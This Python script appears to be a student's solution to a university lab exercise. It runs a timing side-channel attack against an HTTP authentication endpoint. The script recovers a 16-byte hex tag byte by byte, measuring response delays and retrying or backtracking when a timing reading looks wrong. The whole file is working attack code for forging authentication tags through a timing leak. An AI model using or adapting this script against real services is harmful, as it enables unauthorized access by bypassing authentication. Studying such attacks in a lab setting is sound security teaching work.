import requests
import time


def hex_list_gen():
    hex_list = []
    for i in range(256):
        hex_list.append( "{:x}".format(i))

    for i in range(16):
            hex_list[i] = "0" +  hex_list[i]
    return hex_list

def convert_to_string(list):    
    return (''.join([str(elem) for elem in list]))

def convert_to_list(string):
    list1=[]
    while string:
        list1.append(string[:2])
        string = string[2:]
    return list1

def testTag(tag):
    req = requests.get(url + tag).elapsed.total_seconds() * 1000
    for x in range(10):
        req_time = requests.get(url + tag).elapsed.total_seconds() *1000
        if req_time < req:
            req = req_time
    print("The lowest result is " + str(req))
    return req

delay = 20
url = "http://dart.cse.kau.se:12345/auth/" + str(delay) + "/amanjohn/"
tags = '00000000000000000000000000000000'
tags = convert_to_list(tags)

hex_list = hex_list_gen()
start = time.time()

i = 0
while i < len(tags):
    x = 0
    while x < len(hex_list): 
        min_time = delay * (i + 1)  
        tags[i] = hex_list[x]

        resp_time_ms = requests.get(url + convert_to_string(tags)).elapsed.total_seconds() * 1000
        print("Time :" + str(resp_time_ms) + " for tag : " + convert_to_string(tags))
        if resp_time_ms > min_time:
                
            #Check lowest response time to make sure it's correct and not below delay
            resp_time_ms = testTag(convert_to_string(tags))

            if resp_time_ms > min_time:
                print ("Found " + hex_list[x] + " as index " + str(i) + " of tag")
                if(i!=15):
                    break
                        
                if(i == 15):
                    req = requests.get(url + convert_to_string(tags))
                    if req.status_code != 200:
                        print("Not correct")
                            
            if (resp_time_ms < (delay * (i))) & (i > 0):
                print("Something went wrong go back an index")
                tags[i] = "00"
                i = i - 1
        x = x + 1        
           
    i = i + 1

print("Correct! "+ url + convert_to_string(tags))
